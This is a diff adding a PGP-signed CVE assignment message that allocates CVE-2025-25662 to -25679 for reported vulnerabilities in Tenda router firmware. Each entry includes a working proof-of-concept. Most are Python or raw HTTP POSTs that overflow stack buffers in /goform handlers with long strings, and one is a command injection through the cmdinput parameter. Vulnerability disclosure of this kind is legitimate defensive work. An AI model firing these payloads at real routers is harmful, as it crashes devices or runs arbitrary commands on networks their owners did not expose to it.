@@ -1,0 +1,805 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
+
+
+> [Suggested description]
+> Tenda O4 V3.0 V1.0.0.10(2936) is vulnerable to Buffer Overflow in the
+> function SafeSetMacFilter of the file /goform/setMacFilterList via the
+> argument remark/type/time.
+>
+> ------------------------------------------
+>
+> [Vulnerability Type]
+> Buffer Overflow
+>
+> ------------------------------------------
+>
+> [Vendor of Product]
+> https://www.tenda.com.cn
+>
+> ------------------------------------------
+>
+> [Affected Product Code Base]
+> Tenda O4 - Tenda O4 V3.0 V1.0.0.10(2936)
+>
+> ------------------------------------------
+>
+> [Affected Component]
+> The vulnerability affects the function from SafeSetMacFilter of the file /goform/setMacFilterList. The manipulation of the argument remark/type/time leads to stack-based buffer overflow.
+>
+> ------------------------------------------
+>
+> [Attack Type]
+> Local
+>
+> ------------------------------------------
+>
+> [Impact Denial of Service]
+> true
+>
+> ------------------------------------------
+>
+> [Attack Vectors]
+> stack-based overflow
+> exp
+> import requests
+>
+> ip = "ip"
+> url = f"http://{ip}/goform/setMacFilterList"
+>
+> payload = "a" * 5000
+>
+> data = {
+>     "action": "add",
+>     "time": payload
+> }
+>
+> response = requests.post(url, data=data)
+>
+> print(f"Status Code: {response.status_code}")
+> print(f"Response: {response.text}")
+>
+> ------------------------------------------
+>
+> [Discoverer]
+> FANFAN
+>
+> ------------------------------------------
+>
+> [Reference]
+> http://tenda.com
+> https://www.tenda.com.cn
+
+Use CVE-2025-25662.
+
+
+> [Suggested description]
+> A vulnerability was found in Tenda AC8V4 V16.03.34.06. Affected is the
+> function SUB_0046AC38 of the file /goform/WifiExtraSet. The
+> manipulation of the argument wpapsk_crypto leads to stack-based buffer
+> overflow.
+>
+> ------------------------------------------
+>
+> [Vulnerability Type]
+> Buffer Overflow
+>
+> ------------------------------------------
+>
+> [Vendor of Product]
+> https://www.tenda.com.cn
+>
+> ------------------------------------------
+>
+> [Affected Product Code Base]
+> Tenda AC8V4 - Tenda AC8V4.0 V16.03.34.06
+>
+> ------------------------------------------
+>
+> [Affected Component]
+> The sub_46AC38 function has a stack overflow vulnerability. It accepts a user-controlled wpapsk_crypto parameter from a POST request and copies it into a fixed-size buffer v21 using strcpy.
+>
+> ------------------------------------------
+>
+> [Attack Type]
+> Context-dependent
+>
+> ------------------------------------------
+>
+> [Impact Denial of Service]
+> true
+>
+> ------------------------------------------
+>
+> [Attack Vectors]
+> import requests
+>
+> url = "http://192.168.2.1:80/goform/WifiExtraSet"
+>
+> headers = {
+>     "Content-Type": "application/x-www-form-urlencoded",
+> }
+>
+> data = {
+>     "wifi_chkHz": "0",
+>     "wl_mode": "a24l",
+>     "mac": "111", 
+>     "handset": "0",
+>     "wpapsk_crypto": "s"*600, 
+>     "wpapsk_key": "bXF"
+> }
+>
+> response = requests.post(url, headers=headers, data=data)
+>
+> print(response.status_code)
+> print(response.text)
+>
+> ------------------------------------------
+>
+> [Discoverer]
+> FANFAN
+>
+> ------------------------------------------
+>
+> [Reference]
+> http://tenda.com
+> https://www.tenda.com.cn
+
+Use CVE-2025-25663.
+
+
+> [Suggested description]
+> Tenda AC8V4 V16.03.34.06 was discovered to contain a stack overflow via
+> the shareSpeed parameter in the sub_49E098 function.
+>
+> ------------------------------------------
+>
+> [Vulnerability Type]
+> Buffer Overflow
+>
+> ------------------------------------------
+>
+> [Vendor of Product]
+> https://www.tenda.com.cn
+>
+> ------------------------------------------
+>
+> [Affected Product Code Base]
+> Tenda AC8V4 - Tenda AC8V4.0 V16.03.34.06
+>
+> ------------------------------------------
+>
+> [Affected Component]
+> Tenda AC8 V16.03.34.06 were discovered to contain a stack overflow via the shareSpeed parameter in the sub_49E098 function.
+>
+> ------------------------------------------
+>
+> [Attack Type]
+> Remote
+>
+> ------------------------------------------
+>
+> [Impact Denial of Service]
+> true
+>
+> ------------------------------------------
+>
+> [Attack Vectors]
+> import requests
+>
+> headers = {
+>     'Host': '192.168.2.1',
+>     'Accept': '*/*',
+>     'X-Requested-With': 'XMLHttpRequest',
+>     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
+>     'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+>     'Accept-Encoding': 'gzip, deflate',
+>     'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
+>     'Connection': 'close',
+> }
+> ip = "192.168.2.1"
+> ipaddr = "1" * 0x1000
+> data = 'bindnum=1&list=deviceName1\r10:11:11:11:11:11\r' + ipaddr
+>
+> response = requests.post(
+>     f'http://{ip}/goform/SetIpMacBind',
+>     headers=headers,
+>     data=data,
+>     verify=False)
+>
+> ------------------------------------------
+>
+> [Reference]
+> http://tenda.com
+> https://www.tenda.com.cn
+
+Use CVE-2025-25664.
+
+
+
+
+
+
+
+
+
+
+
+
+> [Suggested description]
+> Tenda AC8V4 V16.03.34.06 was discovered to contain a stack overflow via
+> the urls parameter in the function get_parentControl_list_Info.
+>
+> ------------------------------------------
+>
+> [Vulnerability Type]
+> Buffer Overflow
+>
+> ------------------------------------------
+>
+> [Vendor of Product]
+> https://www.tenda.com.cn
+>
+> ------------------------------------------
+>
+> [Affected Product Code Base]
+> Tenda AC8V4 - Tenda AC8V4.0 V16.03.34.06
+>
+> ------------------------------------------
+>
+> [Affected Component]
+> Tenda AC8 V16.03.34.06  was discovered to contain a stack overflow via the urls parameter in the function get_parentControl_list_Info.
+>
+> ------------------------------------------
+>
+> [Attack Type]
+> Remote
+>
+> ------------------------------------------
+>
+> [Impact Denial of Service]
+> true
+>
+> ------------------------------------------
+>
+> [Attack Vectors]
+> import requests
+>
+> ip = '192.168.2.1'
+> headers = {
+>     'Host': ip,
+>     'Accept': '*/*',
+>     'X-Requested-With': 'XMLHttpRequest',
+>     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
+>     'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+>     'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
+>     'Connection': 'close',
+> }
+>
+> urls = "a" * 1000
+> data = {
+>     'deviceId': '10:11:11:11:11:16',
+>     'deviceName': 'deviceNAME6',
+>     'enable': '1',
+>     'time': '19:00-20:00',
+>     'url_enable': '1',
+>     'urls': urls,
+>     'day': '1,1,1,1,1,1,1',
+>     'limit_type': '0',
+> }
+>
+> response = requests.post(
+>    f'http://{ip}/goform/saveParentControlInfo',
+>     headers=headers,
+>     data=data,
+>     verify=False,
+> )
+>
+> ------------------------------------------
+>
+> [Reference]
+> http://tenda.com
+> https://www.tenda.com.cn
+
+Use CVE-2025-25667.
+
+
+> [Suggested description]
+> Tenda AC8V4 V16.03.34.06 was discovered to contain a stack overflow via
+> the shareSpeed parameter in the sub_47D878 function.
+>
+> ------------------------------------------
+>
+> [Vulnerability Type]
+> Buffer Overflow
+>
+> ------------------------------------------
+>
+> [Vendor of Product]
+> https://www.tenda.com.cn
+>
+> ------------------------------------------
+>
+> [Affected Product Code Base]
+> Tenda AC8V4 - Tenda AC8V4.0 V16.03.34.06
+>
+> ------------------------------------------
+>
+> [Affected Component]
+> Tenda AC8 V16.03.34.06 were discovered to contain a stack overflow via the shareSpeed parameter in the sub_47D878 function.
+>
+> ------------------------------------------
+>
+> [Attack Type]
+> Remote
+>
+> ------------------------------------------
+>
+> [Impact Denial of Service]
+> true
+>
+> ------------------------------------------
+>
+> [Attack Vectors]
+> import requests
+>
+> ip = '192.168.2.1'
+> headers = {
+>     'Host': ip,
+>     'Accept': '*/*',
+>     'X-Requested-With': 'XMLHttpRequest',
+>     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
+>     'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+>     'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
+>     'Connection': 'close',
+> }
+>
+> deviceList = '1'*1000 + "\r10:11:11:11:11:22"
+> data = 'macFilterType=black&deviceList='+ deviceList
+>
+>
+> response = requests.post(
+>     f'http://{ip}/goform/setMacFilterCfg',
+>     headers=headers,
+>     data=data,
+>     verify=False,
+> )
+>
+> ------------------------------------------
+>
+> [Reference]
+> http://tenda.com
+> https://www.tenda.com.cn
+
+Use CVE-2025-25668.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+> [Suggested description]
+> Tenda AC8V4 V16.03.34.06 was discovered to contain a stack overflow via
+> the shareSpeed parameter in the sub_46AC38 function.
+>
+> ------------------------------------------
+>
+> [Vulnerability Type]
+> Buffer Overflow
+>
+> ------------------------------------------
+>
+> [Vendor of Product]
+> https://www.tenda.com.cn
+>
+> ------------------------------------------
+>
+> [Affected Product Code Base]
+> Tenda AC8V4 - Tenda AC8V4.0 V16.03.34.06
+>
+> ------------------------------------------
+>
+> [Affected Component]
+> Tenda AC8 V16.03.34.06 were discovered to contain a stack overflow via the shareSpeed parameter in the sub_46AC38 function.
+>
+> ------------------------------------------
+>
+> [Attack Type]
+> Remote
+>
+> ------------------------------------------
+>
+> [Impact Denial of Service]
+> true
+>
+> ------------------------------------------
+>
+> [Attack Vectors]
+> import requests
+>
+> url = "http://192.168.2.1/goform/WifiExtraSet"
+>
+> headers = {
+>     "Content-Type": "application/x-www-form-urlencoded",
+> }
+>
+> data = {
+>     "wifi_chkHz": "0",
+>     "wl_mode": "a24l",
+>     "mac": "111", 
+>     "handset": "0",
+>     "wpapsk_crypto": "s"*600, 
+>     "wpapsk_key": "bXF" 
+> }
+>
+> response = requests.post(url, headers=headers, data=data)
+>
+> print(response.status_code)
+> print(response.text)
+>
+> ------------------------------------------
+>
+> [Reference]
+> http://tenda.com
+> https://www.tenda.com.cn
+
+Use CVE-2025-25673.
+
+
+> [Suggested description]
+> Tenda AC10 V1.0 V15.03.06.23 is vulnerable to Buffer Overflow in
+> form_fast_setting_wifi_set via the parameter ssid.
+>
+> ------------------------------------------
+>
+> [Vulnerability Type]
+> Buffer Overflow
+>
+> ------------------------------------------
+>
+> [Vendor of Product]
+> https://www.tenda.com.cn
+>
+> ------------------------------------------
+>
+> [Affected Product Code Base]
+> Tenda AC10 - AC10 V1.0V15.03.06.23
+>
+> ------------------------------------------
+>
+> [Affected Component]
+> form_fast_setting_wifi_set,ssid
+>
+> ------------------------------------------
+>
+> [Attack Type]
+> Remote
+>
+> ------------------------------------------
+>
+> [Impact Denial of Service]
+> true
+>
+> ------------------------------------------
+>
+> [Attack Vectors]
+> import requests
+> ip ='192.168.2.1:80'
+> url =f"http://{ip}/goform/fast_setting_wifi_set"
+> data ={"ssid":'a'*0x100}
+> ret = requests.post(url, data)
+>
+> ------------------------------------------
+>
+> [Reference]
+> http://tenda.com
+> https://www.tenda.com.cn
+
+Use CVE-2025-25674.
+
+
+> [Suggested description]
+> Tenda AC10 V1.0 V15.03.06.23 has a command injection vulnerablility
+> located in the formexeCommand function. The str variable receives the
+> cmdinput parameter from a POST request and is later assigned to the
+> cmd_buf variable, which is directly used in the doSystemCmd function,
+> causing an arbitrary command execution.
+>
+> ------------------------------------------
+>
+> [VulnerabilityType Other]
+> RCE
+>
+> ------------------------------------------
+>
+> [Vendor of Product]
+> https://www.tenda.com.cn
+>
+> ------------------------------------------
+>
+> [Affected Product Code Base]
+> Tenda AC10 - AC10V1.0V15.03.06.23
+>
+> ------------------------------------------
+>
+> [Affected Component]
+> formexeCommand,
+>
+> ------------------------------------------
+>
+> [Attack Type]
+> Remote
+>
+> ------------------------------------------
+>
+> [Impact Code execution]
+> true
+>
+> ------------------------------------------
+>
+> [Attack Vectors]
+> import requests
+>
+> ip = '192.168.2.1:80'
+>
+> url = f"http://{ip}/goform/exeCommand"
+>
+> data = {'cmdinput':'echo \\'hack!!!\\';ls;'}
+>
+> ret = requests.post(url, data)
+>
+> ------------------------------------------
+>
+> [Reference]
+> http://tenda.com
+> https://www.tenda.com.cn
+
+Use CVE-2025-25675.
+
+
+> [Suggested description]
+> Tenda i12 V1.0.0.10(3805) was discovered to contain a buffer overflow
+> via the list parameter in the formwrlSSIDset function.
+>
+> ------------------------------------------
+>
+> [Vulnerability Type]
+> Buffer Overflow
+>
+> ------------------------------------------
+>
+> [Vendor of Product]
+> https://www.tenda.com.cn/material/show/102572
+>
+> ------------------------------------------
+>
+> [Affected Product Code Base]
+> Tenda i12 - Tenda i12  V1.0.0.10(3805)
+>
+> ------------------------------------------
+>
+> [Affected Component]
+> Tenda i12  V1.0.0.10(3805) was discovered to contain a buffer overflow via the list parameter in the formwrlSSIDset function.
+>
+> ------------------------------------------
+>
+> [Attack Type]
+> Remote
+>
+> ------------------------------------------
+>
+> [Impact Denial of Service]
+> true
+>
+> ------------------------------------------
+>
+> [Attack Vectors]
+> POST /goform/wifiSSIDget HTTP/1.1
+> Host: 127.0.0.1
+> sec-ch-ua: "Chromium";v="131", "Not_A Brand";v="24"
+> sec-ch-ua-mobile: ?0
+> sec-ch-ua-platform: "Linux"
+> Accept-Language: zh-CN,zh;q=0.9
+> Upgrade-Insecure-Requests: 1
+> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
+> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+> Sec-Fetch-Site: same-origin
+> Sec-Fetch-Mode: navigate
+> Sec-Fetch-User: ?1
+> Sec-Fetch-Dest: iframe
+> Referer: http://127.0.0.1/index.asp
+> Accept-Encoding: gzip, deflate, br
+> Cookie: user=
+> Connection: close
+> Content-Length: 2070
+>
+> wl_radio=0&index=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+>
+> ------------------------------------------
+>
+> [Reference]
+> http://tenda.com
+> https://www.tenda.com.cn/material/show/102572
+
+Use CVE-2025-25676.
+
+
+
+
+
+
+> [Suggested description]
+> Tenda i12 V1.0.0.10(3805) was discovered to contain a buffer overflow
+> via the funcpara1 parameter in the formSetCfm function.
+>
+> ------------------------------------------
+>
+> [Vulnerability Type]
+> Buffer Overflow
+>
+> ------------------------------------------
+>
+> [Vendor of Product]
+> https://www.tenda.com.cn/material/show/102572
+>
+> ------------------------------------------
+>
+> [Affected Product Code Base]
+> Tenda i12 - Tenda i12  V1.0.0.10(3805)
+>
+> ------------------------------------------
+>
+> [Affected Component]
+> Tenda i12 V1.0.0.10(3805) was discovered to contain a buffer overflow via the funcpara1 parameter in the formSetCfm function.
+>
+> ------------------------------------------
+>
+> [Attack Type]
+> Remote
+>
+> ------------------------------------------
+>
+> [Impact Denial of Service]
+> true
+>
+> ------------------------------------------
+>
+> [Attack Vectors]
+> POST /goform/setcfm HTTP/1.1
+> Host: 127.0.0.1
+> Cache-Control: max-age=0
+> sec-ch-ua: "Chromium";v="131", "Not_A Brand";v="24"
+> sec-ch-ua-mobile: ?0
+> sec-ch-ua-platform: "Linux"
+> Accept-Language: zh-CN,zh;q=0.9
+> Upgrade-Insecure-Requests: 1
+> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
+> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+> Sec-Fetch-Site: same-origin
+> Sec-Fetch-Mode: navigate
+> Sec-Fetch-User: ?1
+> Sec-Fetch-Dest: document
+> Referer: http://127.0.0.1/login.asp
+> Accept-Encoding: gzip, deflate, br
+> Cookie: user=
+> Connection: keep-alive
+> Content-Length: 2103
+>
+> funcname=save_list_data&funcpara2=aaaaa&funcpara1=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+>
+> ------------------------------------------
+>
+> [Reference]
+> http://tenda.com
+> https://www.tenda.com.cn/material/show/102572
+
+Use CVE-2025-25678.
+
+
+> [Suggested description]
+> Tenda i12 V1.0.0.10(3805) was discovered to contain a buffer overflow
+> via the index parameter in the formWifiMacFilterSet function.
+>
+> ------------------------------------------
+>
+> [Vulnerability Type]
+> Buffer Overflow
+>
+> ------------------------------------------
+>
+> [Vendor of Product]
+> https://www.tenda.com.cn/material/show/102572
+>
+> ------------------------------------------
+>
+> [Affected Product Code Base]
+> Tenda i12 - Tenda i12  V1.0.0.10(3805)
+>
+> ------------------------------------------
+>
+> [Affected Component]
+> Tenda i12 V1.0.0.10(3805) was discovered to contain a buffer overflow via the index parameter in the formWifiMacFilterSet function.
+>
+> ------------------------------------------
+>
+> [Attack Type]
+> Remote
+>
+> ------------------------------------------
+>
+> [Impact Denial of Service]
+> true
+>
+> ------------------------------------------
+>
+> [Attack Vectors]
+> POST /goform/WifiMacFilterSet HTTP/1.1
+> Host: 127.0.0.1
+> Cache-Control: max-age=0
+> sec-ch-ua: "Chromium";v="131", "Not_A Brand";v="24"
+> sec-ch-ua-mobile: ?0
+> sec-ch-ua-platform: "Linux"
+> Accept-Language: zh-CN,zh;q=0.9
+> Upgrade-Insecure-Requests: 1
+> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
+> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+> Sec-Fetch-Site: same-origin
+> Sec-Fetch-Mode: navigate
+> Sec-Fetch-User: ?1
+> Sec-Fetch-Dest: document
+> Referer: http://127.0.0.1/login.asp
+> Accept-Encoding: gzip, deflate, br
+> Cookie: user=
+> Connection: keep-alive
+> Content-Length: 2070
+>
+>
+> wl_radio=0&index=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+>
+> ------------------------------------------
+>
+> [Reference]
+> http://tenda.com
+> https://www.tenda.com.cn/material/show/102572
+
+Use CVE-2025-25679.
+
+
+- --
+CVE Assignment Team
+M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
+ [ A PGP key is available for encrypted communications at
+   https://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+
+iQIzBAEBCAAdFiEEWDhf/nspQtINboAej/vgNEiM5UoFAmevUKEACgkQj/vgNEiM
+5UqEUQ//UFlKK98Kep3YtZHATPNs4QH3Rt7XgnXUNY6K3eaVcL4cYd3YO/NvRyrs
+PCjwyl8Vdh1rhcXRhAIdl28gWjIX0tGvE9JrUuovxpYY2GkUK6jqaniknHyfAuKV
+70+8IYEpiUTKeZ2FpBAdy+y2w1zX5XwQORwIk+VQhrozAWyRs80jUsQFrqFNuqnT
+mKVb0J/cfqAF8b4Pdx8zQxZe38K/arhVf8Eyfsv8ytk7LqsNOtjnWsOiYg6sSBGJ
+/Wi51ns/bkIMWYEA0lPaHYfTLaeJKc16sPaMQuNdXIkkymPk0DFnsZWYbp7td6bC
+Iujew9awEznCP7lmeuLEnY9A9KpVDUyW/nqS+2hyztLOil1V9wUtwZCCrA58ZETn
+YrhDZjbtC2zmdgO3MQZXes/Ac5UfsfWUHMSZlKAE87TrIgTjpDTI8YYUfYsTxnkQ
+0LHAhksv9lMAERLLou+Bg5jnPiuTbLAzG3ae8tP+vS/nvjsZL8Iwrm03myNpX6dH
+nAGI7ub6wafpXHao4FRVnl1yibEFtVAINPwxnvmwqk8V8fwEP8Dn7tLSwVlN5AVo
+q48qNFGdkUCZX3TCI+cQILA7f/qi8HIeLlNzs62x7tw6QFnJ0CKqMtnFZGvMOjaQ
+tXkasih+s5SE4izCnNSu5OJZXE3XW7MNpBgpEhcjM2Czm8jq/Pw=
+=Kp9W
+-----END PGP SIGNATURE-----
+-----END PGP SIGNATURE-----
